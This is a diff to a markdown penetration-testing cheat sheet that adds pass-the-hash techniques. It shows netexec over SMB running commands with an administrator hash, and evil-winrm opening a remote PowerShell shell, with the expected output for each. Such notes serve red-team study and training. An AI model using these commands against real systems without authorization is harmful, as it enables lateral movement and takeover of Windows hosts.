@@ -4038,7 +4038,50 @@ netexec smb 172.16.1.0/24 -u Administrator -d . -H <HASH>
 # SMB         <DOMAIN_IP_2>   445    MS01             [+] .\Administrator <HASH> (Pwn3d!)
 ```
 
+<details>
+<summary><h4>Command Execution</h4></summary>
 
+We can use the option -x to execute commands.
+
+```bash
+netexec smb <DOMAIN_IP> -u Administrator -d . -H <HASH> -x whoami
+```
+
+**Expcted output**
+
+```bash
+# SMB         <DOMAIN_IP>  445    MS01            [*] Windows 10 Enterprise 10240 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:True)
+# SMB         <DOMAIN_IP>  445    MS01            [+] .\Administrator <HASH> (Pwn3d!)
+# SMB         <DOMAIN_IP>  445    MS01            [+] Executed command 
+# SMB         <DOMAIN_IP>  445    MS01            MS01\administrator
+```
+
+</details>
+
+</details>
+
+<details>
+<summary><h3>Pass the Hash with evil-winrm (Linux)</h3></summary>
+
+Evil-WinRM provides an alternative to SMB for Pass-the-Hash (PtH) attacks when:
+
+* SMB ports are blocked/filtered
+* Administrative rights are unavailable
+* PowerShell Remoting (WinRM) is enabled (TCP 5985/5986)
+
+```bash
+evil-winrm -i <DOMAIN_IP> -u Administrator -H <HASH>
+```
+
+**Expcted output**
+
+```bash
+# Evil-WinRM shell v3.3
+
+# Info: Establishing connection to remote endpoint
+
+# *Evil-WinRM* PS C:\Users\Administrator\Documents>
+```
 
 </details>
 
